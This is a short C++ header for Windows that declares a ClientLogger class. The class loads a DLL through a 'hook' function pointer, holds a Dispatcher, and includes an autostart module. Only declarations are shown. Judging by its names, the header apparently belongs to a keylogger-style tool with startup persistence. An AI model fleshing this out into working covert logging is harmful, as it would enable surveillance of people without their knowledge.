#ifndef _CLIENTLOGGER_HPP_
# define _CLIENTLOGGER_HPP_

# include <string>
# include <thread>
# include <Lmcons.h>

# include "Dispatcher.hpp"
# include <Windows.h>

# include "AutoStart.hpp"

typedef void(__stdcall *pFunc)(void);
typedef bool(__stdcall *hook)(std::shared_ptr<Dispatcher>);

class ClientLogger
{
public:
	ClientLogger();
	~ClientLogger();

	bool	init(const char *name);
	void	run();

private:
	bool	unset();

	bool						_quit;
	HMODULE						_hDll;
	std::string					_filePath;
	std::shared_ptr<Dispatcher>	_disp;
};

#endif